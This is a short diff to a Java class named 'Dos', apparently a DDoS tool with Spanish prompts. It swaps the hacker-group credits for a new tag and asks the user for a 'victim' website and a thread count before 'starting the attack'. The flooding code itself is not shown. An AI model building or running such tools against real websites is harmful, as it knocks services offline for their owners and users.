@@ -52,8 +52,8 @@ public class Dos implements Runnable {
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
         System.out.println("by XTEXZZZ");
-        System.out.println("GROUP GHOSTNAZ, KAISERS");
-        System.out.print("Pagina web : ");
+        System.out.println("P4inGvng on top!!!");
+        System.out.print("Pagina web victima : ");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Empezando ataque a su victima: " + url);
@@ -67,7 +67,7 @@ public class Dos implements Runnable {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Configuración de DDoS por: Shadow Tak");
+        
 
         System.out.print("Hilos: ");
         String amount = in.nextLine();
